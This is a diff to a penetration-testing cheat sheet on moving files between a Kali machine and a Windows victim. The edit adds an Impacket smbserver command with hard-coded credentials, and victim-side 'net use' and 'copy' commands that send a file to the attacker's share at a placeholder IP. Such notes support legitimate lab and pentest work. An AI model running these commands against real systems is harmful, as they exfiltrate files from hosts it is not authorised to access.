@@ -15,13 +15,14 @@
 To share files from your Kali machine:
 
 ```bash
-smbserver.py share .
+python smbserver.py share . -user alex -pass alex -smb2support
 ```
 
 To retrieve files on the victim machine:
 
 ```cmd
-copy \\10.10.10.10\share\file.file C:\file.file
+net use \\{ip}\share /u:alex alex
+copy file.file \\{ip}\share
 ```
 
 ### File Searching (Windows)
